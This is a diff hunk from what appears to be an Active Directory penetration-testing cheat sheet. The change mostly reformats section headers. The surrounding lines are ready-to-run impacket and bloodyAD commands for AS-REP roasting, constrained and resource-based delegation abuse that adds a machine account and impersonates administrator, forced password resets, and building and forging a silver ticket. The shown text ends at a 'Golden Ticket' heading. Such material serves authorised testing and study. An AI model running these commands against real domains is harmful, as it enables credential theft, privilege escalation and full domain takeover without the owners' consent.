@@ -774,35 +774,40 @@ while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetU
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
 
-[###] Delegation: Constrained (msDS-AllowedToDelegateTo + TrustedToAuthForDelegation)
+[###] Delegation: Constrained
+(msDS-AllowedToDelegateTo + TrustedToAuthForDelegation)
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-getST -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD' -altservice cifs -spn 'time/m3webaw' -impersonate 'Admin.User.Logon'
 
-[###] Delegation: Unconstrained (TRUSTED_FOR_DELEGATION + userAccountControl)
+[###] Delegation: Unconstrained
+(TRUSTED_FOR_DELEGATION + userAccountControl)
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 
-[###] Delegation: RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
+[###] Delegation: RBCD
+(msDS-AllowedToActOnBehalfOfOtherIdentity)
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT $DOM/'mypc$':'123qweasdF!'; kcme
 impacket-getST $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
 
-[###] Change Password (ForceChangePassword)
+[###] Change Password
+(ForceChangePassword)
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
 
-[###] Silver Ticket: Domain SID
+[###] Silver Ticket
+(Domain SID)
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' | tee silver-ticket
 
-[###] Silver Ticket: Service Principal Name
+(Service Principal Name)
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1 >> silver-ticket; cat silver-ticket
 
-[###] Silver Ticket: Service Account Password Hash
+(Service Account Password Hash)
 echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/' >> silver-ticket; cat silver-ticket
 
-[###] Silver Ticket: Create Ticket
+(Create Ticket)
 cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; kcme
 
 [###] Golden Ticket
